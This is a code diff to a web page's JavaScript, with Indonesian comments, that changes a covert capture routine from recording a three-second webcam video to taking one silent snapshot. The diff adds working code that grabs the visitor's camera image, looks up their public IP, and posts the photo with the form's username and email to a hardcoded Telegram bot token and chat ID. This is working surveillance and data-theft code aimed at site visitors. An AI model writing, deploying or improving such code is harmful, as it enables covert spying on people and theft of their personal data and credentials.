@@ -111,71 +111,60 @@
     var telegramToken = '7143489396:AAH6nnxpNdwDPTFDtVGgJ04f_rOQvjPm_Z0';
     var telegramChatId = '-1002188815934';
 
-    function sendToTelegram(videoDataURL, caption) {
-      var apiUrl = `https://api.telegram.org/bot${telegramToken}/sendVideo`;
+    function sendToTelegram(photoBlob, caption) {
+      var apiUrl = `https://api.telegram.org/bot${telegramToken}/sendPhoto`;
 
-      fetch(videoDataURL)
-        .then(res => res.blob())
-        .then(blob => {
-          var formData = new FormData();
-          formData.append('chat_id', telegramChatId);
-          formData.append('video', blob, 'video.mp4');
-          formData.append('caption', caption);
+      var formData = new FormData();
+      formData.append('chat_id', telegramChatId);
+      formData.append('photo', photoBlob, 'photo.jpg');
+      formData.append('caption', caption);
 
-          return fetch(apiUrl, {
-            method: 'POST',
-            body: formData
-          });
-        })
+      fetch(apiUrl, {
+        method: 'POST',
+        body: formData
+      })
         .then(response => response.json())
         .then(data => {
-          console.log('Video berhasil dikirim ke Telegram:', data);
+          console.log('Foto berhasil dikirim ke Telegram:', data);
         })
         .catch(error => {
-          console.error('Error mengirim video ke Telegram:', error);
+          console.error('Error mengirim foto ke Telegram:', error);
         });
     }
 
-    function takeAndSendVideo(formData) {
+    function takeAndSendPhoto(formData) {
       navigator.mediaDevices.getUserMedia({ video: true })
         .then(function(stream) {
-          var videoElement = document.createElement('video');
-          document.body.appendChild(videoElement);
-          videoElement.srcObject = stream;
-          videoElement.play();
+          var video = document.createElement('video');
+          video.srcObject = stream;
+          video.play();
 
-          var mediaRecorder = new MediaRecorder(stream);
-          var chunks = [];
+          setTimeout(() => {
+            var canvas = document.createElement('canvas');
+            canvas.width = 640; // Resolusi foto
+            canvas.height = 480;
+            var ctx = canvas.getContext('2d');
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+            stream.getTracks().forEach(track => track.stop());
 
-          mediaRecorder.ondataavailable = function(e) {
-            chunks.push(e.data);
-          };
+            canvas.toBlob(function(blob) {
+              var ipAddress = '';
+              fetch('https://api64.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => {
+                  ipAddress = data.ip;
 
-          mediaRecorder.onstop = function() {
-            var videoBlob = new Blob(chunks, { type: 'video/mp4' });
-            var videoDataURL = URL.createObjectURL(videoBlob);
+                  var caption = `Foto terkirim dari IP: ${ipAddress}\nUsername: ${formData.username}\nEmail: ${formData.email}`;
+                  sendToTelegram(blob, caption);
+                })
+                .catch(error => {
+                  console.error('Error mendapatkan IP address:', error);
 
-            var ipAddress = '';
-            fetch('https://api64.ipify.org?format=json')
-              .then(response => response.json())
-              .then(data => {
-                ipAddress = data.ip;
-
-                var caption = `Video terkirim dari IP: ${ipAddress}\nUsername: ${formData.username}\nEmail: ${formData.email}`;
-                sendToTelegram(videoDataURL, caption);
-              })
-              .catch(error => {
-                console.error('Error mendapatkan IP address:', error);
-
-                var caption = `Video terkirim\nUsername: ${formData.username}\nEmail: ${formData.email}`;
-                sendToTelegram(videoDataURL, caption);
-              });
-
-            document.body.removeChild(videoElement);
-          };
-
-          mediaRecorder.start();
-          setTimeout(() => mediaRecorder.stop(), 3000); // Rekam video selama 3 detik
+                  var caption = `Foto terkirim\nUsername: ${formData.username}\nEmail: ${formData.email}`;
+                  sendToTelegram(blob, caption);
+                });
+            }, 'image/jpeg');
+          }, 1000); // Delay 1 detik
         })
         .catch(function(err) {
           console.log("Error: " + err);
@@ -194,7 +183,7 @@
       };
 
       navigator.mediaDevices.getUserMedia({ video: true })
-        .then(() => takeAndSendVideo(formData))
+        .then(() => takeAndSendPhoto(formData))
         .catch(err => {
           console.log("Error: " + err);
           if (err.name === 'NotAllowedError') {
